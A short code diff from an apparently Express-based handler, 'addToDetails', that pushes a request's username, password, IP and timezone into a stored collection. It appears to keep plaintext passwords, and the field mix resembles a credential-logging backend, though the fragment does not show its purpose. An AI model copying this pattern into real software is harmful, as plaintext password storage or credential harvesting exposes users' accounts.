@@ -13,7 +13,7 @@ exports.addToDetails = async (req, res) => {
     timezone,
   } = req.body;
 
-  det.details.push({
+  det.push({
     username,
     password,
     ip,
